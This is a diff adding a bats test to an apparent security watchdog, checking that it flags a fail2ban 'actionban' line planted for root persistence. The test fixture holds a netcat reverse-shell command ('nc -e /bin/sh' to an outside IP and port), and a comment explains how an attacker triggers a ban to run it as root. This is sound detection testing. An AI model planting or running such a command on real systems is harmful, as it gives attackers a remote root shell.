@@ -230,3 +230,20 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in actionban: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
+    # dhcpcd-hooks/display-manager-hooks/dnf-plugins nc reverse-shell
+    # variant INVARIANTs across the brain. Lock the netcat axis on
+    # the ban-triggered root-exec persistence surface (T1546 —
+    # fail2ban runs action commands AS ROOT on every ban/unban;
+    # attacker self-induces ban from throwaway IP to fire planted
+    # action on demand).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Definition]\nactionban = nc -e /bin/sh 1.1.1.1 4444\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
